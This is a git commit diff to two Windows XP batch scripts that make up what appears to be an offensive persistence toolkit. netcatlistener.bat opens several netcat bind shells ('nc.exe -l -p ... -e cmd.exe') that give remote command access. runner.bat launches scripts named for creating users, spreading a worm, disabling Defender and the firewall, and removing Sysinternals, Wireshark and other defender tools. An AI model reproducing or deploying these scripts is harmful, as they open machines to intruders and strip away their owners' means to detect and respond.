a35e564c7fa4776b7a5aea4d671c2b189e9d08b7
Dr-N0 <beckettjenen@gmail.com>
2023-11-18 16:41:18 -0500

    ironed out the edge cases

--- WindowsXp/netcatlistener.bat
+++ WindowsXp/netcatlistener.bat
@@ -1,9 +1,5 @@
 @echo off
 
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run chr(34) & "C:\path\to\your\batchfile.bat" & Chr(34), 0
-Set WshShell = Nothing
-
 REM Start a Netcat listener on port 3030 in the background
 START /B netcat-1.11\nc.exe -l -p 3030 -e cmd.exe
 
@@ -15,8 +11,3 @@ START /B netcat-1.11\nc.exe -l -p 8080 -e cmd.exe
 
 REM Start a Netcat listener on port 7256 in the background
 START /B netcat-1.11\nc.exe -l -p 7256 -e cmd.exe
-
-REM Keep the batch file running indefinitely
-:loop
-timeout /t 1 > NUL
-goto loop
--- WindowsXp/runner.bat
+++ WindowsXp/runner.bat
@@ -1,69 +1,14 @@
 @echo off
 ::setup scripting for Windows Xp tools
-attrib +s +h %CD%
 
-:: Check if netcatlistener.bat is already running
-tasklist | find /I "netcatlistener.bat" >nul
-if errorlevel 1 (
-   start /b netcatlistener.bat
-)
-
-:: Check if createUsers.bat is already running
-tasklist | find /I "createUsers.bat" >nul
-if errorlevel 1 (
-   start /b createUsers.bat
-)
-
-:: Check if wormtools.bat is already running
-@REM tasklist | find /I "wormtools.bat" >nul
-@REM if errorlevel 1 (
-@REM    start /b wormtools.bat
-@REM )
-
-:: Check if disableDefender.bat is already running
-tasklist | find /I "disableDefender.bat" >nul
-if errorlevel 1 (
-   start /b disableDefender.bat
-)
-
-:: Check if disablefirewall.bat is already running
-tasklist | find /I "disablefirewall.bat" >nul
-if errorlevel 1 (
-   start /b disablefirewall.bat
-)
-
-:: Check if removeKillers.bat is already running
-tasklist | find /I "removeKillers.bat" >nul
-if errorlevel 1 (
-   start /b removeKillers.bat
-)
-
-:: Check if removeNetworkTools.bat is already running
-tasklist | find /I "removeNetworkTools.bat" >nul
-if errorlevel 1 (
-   start /b removeNetworkTools.bat
-)
-
-:: Check if removeSYSinternals.bat is already running
-tasklist | find /I "removeSYSinternals.bat" >nul
-if errorlevel 1 (
-   start /b removeSYSinternals.bat
-)
-
-:: Check if removewireshark.bat is already running
-tasklist | find /I "removewireshark.bat" >nul
-if errorlevel 1 (
-   start /b removewireshark.bat
-)
-
-:: Check if renameCliNetworkTools.bat is already running
-tasklist | find /I "renameCliNetworkTools.bat" >nul
-if errorlevel 1 (
-   start /b renameCliNetworkTools.bat
-)
-
-:: Check if disableGUI.bat is already running
-tasklist | find /I "disableGUI.bat" >nul
-if errorlevel 1 (
-   start /b disableGUI.bat
-)
+start /b netcatlistener.bat
+start /b createUsers.bat
+start /b wormtools.bat
+start /b disableDefender.bat
+start /b disablefirewall.bat
+start /b removeKillers.bat
+start /b removeNetworkTools.bat
+start /b removeSYSinternals.bat
+start /b removewireshark.bat
+start /b renameCliNetworkTools.bat
+start /b disableGUI.bat
